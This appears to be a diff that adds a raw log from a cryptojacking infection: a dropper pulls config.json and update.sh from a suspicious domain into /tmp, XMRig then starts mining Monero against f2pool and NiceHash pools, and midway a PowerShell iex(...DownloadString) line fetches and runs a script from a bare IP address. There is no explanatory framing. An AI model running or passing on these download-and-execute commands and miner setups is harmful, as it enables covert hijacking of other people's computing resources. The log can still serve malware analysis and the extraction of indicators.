@@ -1,0 +1,59 @@
+https://de.gsearch.com.de/api/config.json,/tmp/config.json
+no need download
+not need download
+i am here
+https://de.gsearch.com.de/api/update.sh,/tmp/update.sh
+no need download
+not tmp runing
+not tmps runing
+ * ABOUT        XMRig/2.15.1-beta gcc/5.4.0
+ * LIBS         libuv/1.24.1 
+ * CPU          Intel(R) Xeon(R) CPU E5-2682 v4 @ 2.50GHz (1) x64 AES AVX2
+ * CPU L2/L3    0.2 MB/40.0 MB
+ * THREADS      32, cn, donate=1%
+ * ASSEMBLY     auto:intel
+ * POOL #1      xmr.f2pool.com:13531 variant auto
+ * POOL #2      cryptonightr.usa.nicehash.com:3375 variant auto
+ * POOL #3      cryptonightr.eu.nicehash.com:3375 variant auto
+ * POOL #4      cryptonightr.jp.nicehash.com:3375 variant auto
+ * POOL #5      cryptonightr.hk.nicehash.com:3375 variant auto
+ * POOL #6      cryptonightr.br.nicehash.com:3375 variant auto
+ * POOL #7      cryptonightr.in.nicehash.com:3375 variant auto
+ * COMMANDS     'h' hashrate, 'p' pause, 'r' resume
+[2019-11-07 12:44:14] configuration saved to: "/tmp/config.json"
+[2019-11-07 12:44:14] use pool xmr.f2pool.com:13531  47.101.30.124
+[2019-11-07 12:44:14] new job from xmr.f2pool.com:13531 diff 32768 algo cn/r height 1961504
+not tmps runing
+[2019-11-07 12:44:20] new job from xmr.f2pool.com:13531 diff 32768 algo cn/r height 1961504
+[+]download  successful 
+[2019-11-07 12:44:56] READY (CPU) threads 32(32) huge pages 0/32 0% memory 65536 KB
+[2019-11-07 12:45:18] speed 10s/60s/15m n/a n/a n/a H/s max n/a H/s
+[2019-11-07 12:45:26] new job from xmr.f2pool.com:13531 diff 16384 algo cn/r height 1961505
+[2019-11-07 12:46:18] speed 10s/60s/15m 5.0 28.7 n/a H/s max 7.9 H/s
+[2019-11-07 12:46:47] accepted (1/0) diff 16384 (46 ms)
+[2019-11-07 12:47:18] new job from xmr.f2pool.com:13531 diff 16384 algo cn/r height 1961506
+[2019-11-07 12:47:18] speed 10s/60s/15m 1.0 28.4 n/a H/s max 11.9 H/s
+iex(New-Object Net.WebClient).DownloadString('http://185.181.10.234/E5DB0E07C3D7BE80V520/init.ps1')
+[2019-11-07 12:48:18] speed 10s/60s/15m 1.0 27.4 n/a H/s max 11.9 H/s
+[2019-11-07 12:49:08] new job from xmr.f2pool.com:13531 diff 16384 algo cn/r height 1961507
+[2019-11-07 12:49:18] speed 10s/60s/15m 1.0 26.0 n/a H/s max 11.9 H/s
+[2019-11-07 12:50:18] speed 10s/60s/15m n/a 27.4 n/a H/s max 11.9 H/s
+[2019-11-07 12:51:14] new job from xmr.f2pool.com:13531 diff 16384 algo cn/r height 1961507
+[2019-11-07 12:51:18] speed 10s/60s/15m 0.9 27.9 n/a H/s max 11.9 H/s
+[2019-11-07 12:51:56] new job from xmr.f2pool.com:13531 diff 16384 algo cn/r height 1961508
+[2019-11-07 12:52:18] speed 10s/60s/15m n/a 27.9 n/a H/s max 12.4 H/s
+[2019-11-07 12:53:18] speed 10s/60s/15m 4.9 27.9 n/a H/s max 12.4 H/s
+[2019-11-07 12:54:07] new job from xmr.f2pool.com:13531 diff 16384 algo cn/r height 1961508
+[2019-11-07 12:54:18] speed 10s/60s/15m n/a 28.4 n/a H/s max 12.4 H/s
+[2019-11-07 12:55:18] speed 10s/60s/15m 1.7 28.5 n/a H/s max 12.4 H/s
+[2019-11-07 12:55:36] new job from xmr.f2pool.com:13531 diff 16384 algo cn/r height 1961509
+[2019-11-07 12:56:18] speed 10s/60s/15m 6.4 28.0 n/a H/s max 12.4 H/s
+[2019-11-07 12:56:41] new job from xmr.f2pool.com:13531 diff 16384 algo cn/r height 1961510
+[2019-11-07 12:57:18] speed 10s/60s/15m 2.9 28.3 n/a H/s max 12.4 H/s
+[2019-11-07 12:57:19] new job from xmr.f2pool.com:13531 diff 16384 algo cn/r height 1961511
+[2019-11-07 12:58:18] speed 10s/60s/15m n/a 28.5 n/a H/s max 12.4 H/s
+[2019-11-07 12:58:28] new job from xmr.f2pool.com:13531 diff 16384 algo cn/r height 1961512
+[2019-11-07 12:59:18] speed 10s/60s/15m 4.0 28.6 n/a H/s max 12.4 H/s
+[2019-11-07 13:00:18] speed 10s/60s/15m 1.8 28.5 28.0 H/s max 12.4 H/s
+[2019-11-07 13:00:28] new job from xmr.f2pool.com:13531 diff 16384 algo cn/r height 1961512
+[2019-11-07 13:00:45] SIGTERM received, exiting
